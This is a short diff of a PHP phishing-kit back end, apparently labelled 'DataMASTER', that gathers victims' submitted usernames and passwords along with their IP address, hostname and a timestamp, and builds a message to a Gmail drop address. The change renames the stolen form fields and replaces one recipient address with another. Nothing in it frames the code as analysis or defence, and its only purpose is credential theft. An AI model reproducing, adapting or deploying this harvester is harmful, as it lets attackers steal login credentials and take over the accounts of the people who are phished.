@@ -3,14 +3,14 @@
 $adddate=date("D M d, Y g:i a");
 $ip = getenv("REMOTE_ADDR");
 $host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
-$message .= "Username: ".$_POST['customeru']."\n";
-$message .= "Password: ".$_POST['customerp']."\n";
+$message .= "Username: ".$_POST['userID']."\n";
+$message .= "Password: ".$_POST['password']."\n";
 $message .= "\n";
 $message .= "Date: ".$adddate."\n";
 $message .= "Host: ".$host."\n";
 $message .= "IP: ".$ip."\n";
 $message .= "------------- DataMASTER -------------\n";
-$recipient = "henryparish0@gmail.com";
+$recipient = "henrycrane65@gmail.com";
 $subject = "PDF! Successful ".$_POST['username']."\n";
 $from = "$ip";
 $headers .= $_POST['eMailAdd']."\n";
